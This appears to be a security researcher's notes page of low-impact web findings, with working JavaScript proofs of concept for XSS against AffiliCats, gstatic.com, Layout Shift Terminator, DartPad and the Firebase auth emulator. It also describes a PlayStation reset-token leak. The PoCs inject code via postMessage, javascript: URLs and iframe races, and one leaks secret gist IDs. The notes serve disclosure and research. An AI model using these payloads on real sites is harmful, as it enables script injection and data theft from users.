This is a place for behavior that doesn't have a clear security impact, but I still want to document.

# Google open redirect

# Playstation password reset tokens leak (Not reported, Alesandro can't repo)

**URL:** <https://www.playstation.com/>  
Playstation password reset emails use a insecure `http://` link as `http://click.txn-email.account.sony.com/` has to be loaded over `http:` this uses `exacttarget.com` a email analytics service by salesforce.
"Having worked with ExactTarget before SF acquisition, I can confirm it's a piece of crap enterprise software." ~ Alesandro Ortiz
Both resets done from the same playstation login page:
`sony@email02.account.sony.com` -> http link
`sony@txn-email03.playstation.com` -> https link

## Attack scenario

A local network attacker can gain account takeover if a user attempts to reset their password.
May also require the user's data of birth depending on the account settings.

# XSS on AffiliCats

**URL:** <https://googlechromelabs.github.io/affilicats/forward.html?url=javascript:alert(window.origin)>

The "AffiliCats" website has an open redirect that sets `document.location.href` with the URL param called `url` this allows navigating to `javascript:`

```js
(f = new URLSearchParams(document.location.search)),
  (g = new URL(f.get('url')));
```

## Attack scenario

An attacker controlled website gains the "cutest cats online"

# XSS on GSTATIC (WAI, Awarded for individual impacts reported)

```js
let payload = `
alert(window.origin);
`;

let f = document.createElement('iframe');
f.src =
  'https://www.gstatic.com/alkali/43ecc24c54630568577e5fdcbc826f3153491684.html';
document.body.appendChild(f);
setTimeout(() => {
  f.contentWindow.postMessage(
    {
      resourcePaths: {
        jsPath: 'data:text/html,' + encodeURIComponent(payload)
      }
    },
    '*'
  );
}, 2000);
```

## Attack scenario

Leaking connection and DNS timings for gstatic.com resources via the performance API.
Sometimes it's used as an embed.

# XSS on Layout Shift Terminator

**URL:** <https://googlechromelabs.github.io/layout-shift-terminator/>

Since the page allows embedding and it's possible to navigate nested iframes.
It's possible to race the postMessage bypassing the `event.source === iframe.contentWindow` check.
This could also be done by abusing the chromium max iframe limit with the null contentWindow trick.

```js
f = document.createElement('iframe');
f.hidden = true;
document.body.appendChild(f);

function tryXSS() {
  loop = setInterval(() => {
    try {
      f.contentWindow[1].location = 'about:blank';
      f.contentWindow[1].eval(
        "parent.postMessage({duration: 1, height: '</style><img src=x onerror=alert(origin)>', width: 1}, '*')"
      );
      clearInterval(loop);
      f.contentWindow[1].location = 'https://googlechromelabs.github.io';
    } catch {}
  }, 100);

  f.src = 'https://googlechromelabs.github.io/layout-shift-terminator/?autorun';
}

tryXSS();
setInterval(tryXSS, 1000);
```

# DartPad XSS (dartpad.dev)

This is an editor for Dart code.

By abusing the XSS in `frame.html` it allowed putting interactive content on other people's websites
that use the code embed via a popup window reference which is a spoofing risk especially if providing API keys on that site is expected behavior also It's leaking injected snippets or secret gists of that site.

```js
// Please click, Opening a victim popup needs user activation
onclick = () => {
  let frame = document.createElement('iframe');
  frame.src = 'https://dartpad.dev/frame.html';
  document.body.appendChild(frame);

  payload = `
 // XSS running on the dartpad.dev origin (instead of null)
 let win = open('https://terjanq.me/xss.php?html=%3Ciframe%20src=%22https://dartpad.dev/?id=5c0e154dd50af4a9ac856908061291bc?theme=light%22%3E%3C/iframe%3E');
 setTimeout(() => {
  // Leak the secret gist ID of a cross-site embed
  alert('Leaked: ' + win[0].location.search);
 }, 2000);
`;

  frame.onload = () => {
    frame.contentWindow.postMessage(
      {
        command: 'execute',
        js: payload
      },
      '*'
    );
  };
};
```

This was fixed in <https://github.com/dart-lang/dart-pad/pull/2943> by enforcing the `null` origin sandbox.

# Firebase Authentication Emulator XSS (localhost) Not fixed

This is a local test environment for Firebase.

<https://github.com/firebase/firebase-tools/blob/80964d04ee34b204116be6139e76ad96f427a06d/src/emulator/auth/widget_ui.ts#L65>

Navigates to a `javascript:` path provided in the `redirectUrl` URL parameter for example, `/emulator/auth/handler?apiKey=1&providerId=1&redirectUrl=javascript:alert(origin)&appName=1`
Other emulator XSS, <https://github.com/firebase/firebase-tools/blob/96fe35f4a38736f16a183c76a53112a7b86b2487/src/emulator/functionsEmulator.ts#L1554-L1556>
